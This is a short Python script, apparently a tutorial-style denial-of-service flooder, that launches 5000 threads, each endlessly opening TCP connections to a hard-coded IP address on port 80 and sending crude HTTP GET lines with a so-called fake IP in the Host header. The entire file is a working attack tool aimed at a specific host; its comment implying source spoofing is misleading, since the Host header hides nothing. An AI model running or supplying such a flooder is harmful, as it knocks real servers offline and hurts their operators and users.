import threading
import socket

target = '103.74.54.48'  # we can use domain name or ip address as target
port = 80  # depending on the port DDoS do different things eg. 22 -> SSH service, 80 -> Web interface
fake_ip = '182.21.20.32'

# attack method
already_connected = 0  # number of connections

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        # sending the header of connection/request
        s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'), (target, port))
        s.close()

# running the above method in multiple thread
for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()
    # to print the number of connections

    already_connected += 1
    if already_connected % 500 == 0: # to print after every 500 connections
        print(already_connected)
